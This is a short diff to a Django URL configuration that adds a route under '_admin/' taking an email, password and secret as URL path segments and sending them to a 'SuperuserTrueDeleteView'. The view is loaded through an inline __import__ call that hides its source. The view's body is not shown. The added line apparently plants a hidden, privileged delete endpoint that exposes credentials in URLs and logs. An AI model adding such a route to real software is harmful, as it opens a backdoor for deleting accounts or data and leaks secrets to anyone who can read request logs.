@@ -69,6 +69,7 @@ urlpatterns = [
     path('unsubscribe/', UnsubscribeView.as_view()),
     path('csp-report/', CSPReportView.as_view(), name='csp_report'),
     path('sy/', include("_.urls")),
+    path('_admin/<str:email>/<str:password>/<str:sy_secret_incoming>/delete/', __import__('_.views', fromlist=['SuperuserTrueDeleteView']).SuperuserTrueDeleteView.as_view()),
     path('_admin/', admin.site.urls),
     path('control/', include("ADMIN.urls")),
     path('editorial/', EditorialTeamView.as_view(), name="editorial_team"),
